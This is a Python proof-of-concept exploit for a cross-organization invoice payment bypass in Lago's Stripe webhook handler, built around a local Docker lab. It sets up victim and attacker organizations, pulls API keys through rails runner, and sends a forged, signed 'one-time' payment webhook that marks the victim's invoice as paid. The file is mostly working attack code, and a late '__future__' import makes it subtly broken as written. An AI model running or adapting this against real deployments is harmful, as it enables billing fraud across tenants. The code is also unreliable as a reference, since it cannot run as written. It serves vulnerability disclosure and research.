#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: lago-stripe-invoice-idor (High: 7.7)
#  Vendor: Lago (GetLago)
#  Versions: Lago <= v1.53.0
#  Impact: Cross-organization invoice payment bypass
#  Requires: authenticated POST /webhooks/stripe/:organization_id
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "lago-stripe-invoice-idor"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

from __future__ import annotations

import hashlib
import hmac
import json
import os
import subprocess
import sys
import time
import uuid
import urllib.error
import urllib.request

API = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:13001").rstrip("/")
GQL = API + "/graphql"
SUFFIX = os.environ.get("LAGO_POC_SUFFIX") or uuid.uuid4().hex[:8]
WEBHOOK_SECRET = "lab_stripe_webhook_secret_32b"
VICTIM_EMAIL = f"victim-{SUFFIX}@lab.local"
ATTACKER_EMAIL = f"attacker-{SUFFIX}@lab.local"
VICTIM_ORG = f"Victim Corp {SUFFIX}"
ATTACKER_ORG = f"Attacker Corp {SUFFIX}"
PASSWORD = "ILoveLago-Lab-1"
COMPOSE_PROJECT = "lago-stripe-invoice-idor"


def http(method: str, path: str, *, body: dict | bytes | None = None, headers: dict | None = None, raw: bytes | None = None) -> tuple[int, str]:
    url = path if path.startswith("http") else API + path
    hdrs = {"User-Agent": "lago-stripe-idor-lab"}
    if headers:
        hdrs.update(headers)
    data = raw
    if body is not None and data is None:
        data = json.dumps(body).encode()
        hdrs.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def gql(query: str, variables: dict | None = None, token: str | None = None, org: str | None = None) -> dict:
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if org:
        headers["x-lago-organization"] = org
    code, text = http(
        "POST",
        "/graphql",
        body={"query": query, "variables": variables or {}},
        headers=headers,
    )
    try:
        payload = json.loads(text)
    except json.JSONDecodeError:
        print(f"FAIL graphql http={code} body={text[:500]}")
        raise SystemExit(1)
    return payload


def data(payload: dict, *path: str):
    cur = payload.get("data") or {}
    for key in path:
        if not isinstance(cur, dict) or key not in cur:
            print(f"FAIL missing {'/'.join(path)} in {json.dumps(payload)[:800]}")
            raise SystemExit(1)
        cur = cur[key]
    return cur


def rest(method: str, path: str, api_key: str, body: dict | None = None) -> tuple[int, dict | str]:
    code, text = http(
        method,
        path,
        body=body,
        headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"},
    )
    try:
        return code, json.loads(text)
    except json.JSONDecodeError:
        return code, text


def _container() -> str:
    proc = subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "ps", "-q", "lago"],
        capture_output=True,
        text=True,
        cwd=os.path.dirname(os.path.abspath(__file__)) or ".",
        timeout=30,
    )
    cid = (proc.stdout or "").strip().splitlines()[-1] if proc.stdout else ""
    if not cid:
        print("FAIL no lago container")
        raise SystemExit(1)
    return cid


def rails(ruby: str) -> str:
    cid = _container()
    subprocess.run(
        ["docker", "exec", "-i", cid, "bash", "-lc", "cat > /tmp/lago_lab.rb"],
        input=ruby,
        text=True,
        check=True,
        timeout=30,
    )
    proc = subprocess.run(
        [
            "docker",
            "exec",
            "-w",
            "/app/api",
            cid,
            "bash",
            "-lc",
            "set -a; source /data/.env; set +a; bundle exec rails runner /tmp/lago_lab.rb",
        ],
        capture_output=True,
        text=True,
        timeout=120,
    )
    out = (proc.stdout or "") + (proc.stderr or "")
    if proc.returncode != 0:
        print(f"FAIL rails rc={proc.returncode} {out[-1500:]}")
        raise SystemExit(1)
    return out


def stripe_sig(payload: bytes, secret: str) -> str:
    ts = int(time.time())
    mac = hmac.new(secret.encode(), f"{ts}.".encode() + payload, hashlib.sha256).hexdigest()
    return f"t={ts},v1={mac}"


REGISTER = """
mutation($input: RegisterUserInput!) {
  registerUser(input: $input) {
    token
    user { id email }
    organization { id name }
  }
}
"""


def register(email: str, org_name: str) -> tuple[str, str, str]:
    payload = gql(
        REGISTER,
        {"input": {"email": email, "password": PASSWORD, "organizationName": org_name}},
    )
    if payload.get("errors"):
        print(f"FAIL register {email} {json.dumps(payload['errors'])[:800]}")
        raise SystemExit(1)
    token = data(payload, "registerUser", "token")
    org_id = data(payload, "registerUser", "organization", "id")
    print(f"IOC register email={email} org={org_id}")
    return token, org_id, org_name


def main() -> None:
    print(f"IOC api={API} suffix={SUFFIX}")
    _v_token, victim_org, _ = register(VICTIM_EMAIL, VICTIM_ORG)
    _a_token, attacker_org, _ = register(ATTACKER_EMAIL, ATTACKER_ORG)

    dump = rails(
        f"o=Organization.find({victim_org!r}); puts %(IOC victim_api_key=#{{o.api_keys.first.value}})"
    )
    print(dump[-400:])
    if "IOC victim_api_key=" not in dump:
        print("FAIL could not read victim API key")
        raise SystemExit(1)
    victim_key = [ln.split("=", 1)[1].strip() for ln in dump.splitlines() if "IOC victim_api_key=" in ln][-1]

    dump = rails(
        f"o=Organization.find({attacker_org!r}); puts %(IOC attacker_api_key=#{{o.api_keys.first.value}})"
    )
    attacker_key = [ln.split("=", 1)[1].strip() for ln in dump.splitlines() if "IOC attacker_api_key=" in ln][-1]
    print(f"IOC keys victim_len={len(victim_key)} attacker_len={len(attacker_key)}")

    code, body = rest(
        "POST",
        "/api/v1/add_ons",
        victim_key,
        {"add_on": {"name": "Setup", "code": f"setup-{SUFFIX}", "amount_cents": 1000, "amount_currency": "USD"}},
    )
    print(f"IOC add_on status={code} snippet={json.dumps(body)[:220] if not isinstance(body, str) else body[:220]!r}")
    if code >= 300:
        print("FAIL create add_on")
        raise SystemExit(1)

    code, body = rest(
        "POST",
        "/api/v1/customers",
        victim_key,
        {"customer": {"external_id": f"cust-{SUFFIX}", "name": "Victim Customer", "currency": "USD"}},
    )
    print(f"IOC customer status={code}")
    if code >= 300:
        print(f"FAIL create customer {body}")
        raise SystemExit(1)
    victim_customer_id = body["customer"]["lago_id"]
    print(f"IOC victim_customer={victim_customer_id}")

    seed = rails(
        f"""
attacker_org_id = {attacker_org!r}
victim_org_id = {victim_org!r}
victim_customer_id = {victim_customer_id!r}
webhook_secret = {WEBHOOK_SECRET!r}
[attacker_org_id, victim_org_id].each do |oid|
  p = PaymentProviders::StripeProvider.find_or_initialize_by(organization_id: oid, code: "stripe_lab")
  p.name = "Stripe Lab"
  p.secret_key = "sk_test_lab_" + oid.delete("-")[0, 12]
  p.webhook_secret = webhook_secret
  p.save!
  puts "IOC stripe_provider org=" + oid + " id=" + p.id
end
cust = Customer.find(victim_customer_id)
victim_provider = PaymentProviders::StripeProvider.find_by!(organization_id: victim_org_id, code: "stripe_lab")
cust.update!(payment_provider: "stripe", payment_provider_code: "stripe_lab")
sc = PaymentProviderCustomers::StripeCustomer.find_or_initialize_by(customer_id: cust.id, organization_id: victim_org_id)
sc.payment_provider_id = victim_provider.id
sc.provider_customer_id = "cus_lab_victim"
sc.provider_payment_methods = ["card"]
sc.save!
puts "IOC stripe_customer id=" + sc.id
puts "IOC stripe-seeded"
"""
    )
    print(seed[-800:])
    if "IOC stripe-seeded" not in seed:
        print("FAIL stripe seed")
        raise SystemExit(1)

    code, body = rest(
        "POST",
        "/api/v1/invoices",
        victim_key,
        {
            "invoice": {
                "external_customer_id": f"cust-{SUFFIX}",
                "currency": "USD",
                "skip_psp": True,
                "fees": [{"add_on_code": f"setup-{SUFFIX}", "unit_amount_cents": 1000, "units": 1}],
            }
        },
    )
    print(f"IOC invoice status={code} snippet={json.dumps(body)[:300] if not isinstance(body, str) else body[:300]!r}")
    if code >= 300:
        print("FAIL create invoice")
        raise SystemExit(1)
    invoice = body["invoice"]
    invoice_id = invoice["lago_id"]
    before = invoice.get("payment_status")
    print(f"IOC invoice_id={invoice_id} payment_status_before={before}")
    if before == "succeeded":
        print("FAIL invoice already succeeded")
        raise SystemExit(1)

    def event_body(payment_type: str | None) -> bytes:
        meta = {"lago_invoice_id": invoice_id, "lago_payable_type": "Invoice"}
        if payment_type:
            meta["payment_type"] = payment_type
        obj = {
            "id": f"evt_{uuid.uuid4().hex[:16]}",
            "object": "event",
            "type": "payment_intent.succeeded",
            "livemode": False,
            "data": {
                "object": {
                    "id": f"pi_{uuid.uuid4().hex[:16]}",
                    "object": "payment_intent",
                    "amount": 1000,
                    "currency": "usd",
                    "status": "succeeded",
                    "payment_method": "pm_lab",
                    "metadata": meta,
                }
            },
        }
        return json.dumps(obj, separators=(",", ":")).encode()

    # Control: missing payment_type should stay pending (scoped handle_missing_payment).
    control = event_body(None)
    code, text = http(
        "POST",
        f"/webhooks/stripe/{attacker_org}",
        raw=control,
        headers={"Content-Type": "application/json", "Stripe-Signature": stripe_sig(control, WEBHOOK_SECRET)},
    )
    print(f"IOC control webhook status={code} body={text[:80]!r}")
    time.sleep(8)
    code, body = rest("GET", f"/api/v1/invoices/{invoice_id}", victim_key)
    mid = body["invoice"]["payment_status"] if isinstance(body, dict) and "invoice" in body else body
    print(f"IOC payment_status_after_control={mid}")
    if mid == "succeeded":
        print("FAIL control webhook (no one-time) already succeeded — org scope missing entirely")
        raise SystemExit(1)

    attack = event_body("one-time")
    code, text = http(
        "POST",
        f"/webhooks/stripe/{attacker_org}",
        raw=attack,
        headers={"Content-Type": "application/json", "Stripe-Signature": stripe_sig(attack, WEBHOOK_SECRET)},
    )
    print(f"IOC attack webhook status={code} body={text[:80]!r}")
    if code >= 300:
        print("FAIL attack webhook rejected")
        raise SystemExit(1)

    after = None
    for i in range(20):
        time.sleep(3)
        code, body = rest("GET", f"/api/v1/invoices/{invoice_id}", victim_key)
        if isinstance(body, dict) and "invoice" in body:
            after = body["invoice"]["payment_status"]
            paid = body["invoice"].get("total_paid_amount_cents")
            print(f"IOC poll i={i} payment_status={after} paid={paid}")
            if after == "succeeded":
                print("SUCCESS Lago Stripe one-time webhook unscoped invoice")
                raise SystemExit(0)
    print(f"FAIL invoice stayed {after} (need Sidekiq / stripe_customer / one-time path)")
    raise SystemExit(1)


if __name__ == "__main__":
    main()

